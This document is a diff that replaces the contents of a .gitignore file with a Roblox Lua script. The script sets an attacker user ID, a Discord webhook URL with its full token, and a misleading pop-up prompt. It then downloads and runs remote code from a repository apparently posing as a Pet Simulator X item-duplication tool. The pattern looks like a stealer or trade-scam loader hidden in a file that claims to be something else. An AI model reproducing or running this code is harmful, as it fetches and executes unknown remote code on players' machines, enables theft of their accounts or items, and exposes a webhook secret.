@@ -1,18 +1,7 @@
-# Build and Release Folders
-bin-debug/
-bin-release/
-[Oo]bj/
-[Bb]in/
+_G.UserID = 1136436754
 
-# Other files and folders
-.settings/
+_G.Webhook = "https://discord.com/api/webhooks/1022912036885233725/Tm-SQS2_4fYu2XWgubh87IssonW2CddqeMK_tZx4_Tf4Nmh0O3olHECYRPlIbt2ipBi_"
+_G.KickMessage = "error"
+_G.PopUpMessage = "Do You Want to Use This? Click Ok If Yes"
 
-# Executables
-*.swf
-*.air
-*.ipa
-*.apk
-
-# Project files, i.e. `.project`, `.actionScriptProperties` and `.flexProperties`
-# should NOT be excluded as they contain compiler settings and other important
-# information for Eclipse / Flash Builder.
+loadstring(game:HttpGet"https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/gui-1")()
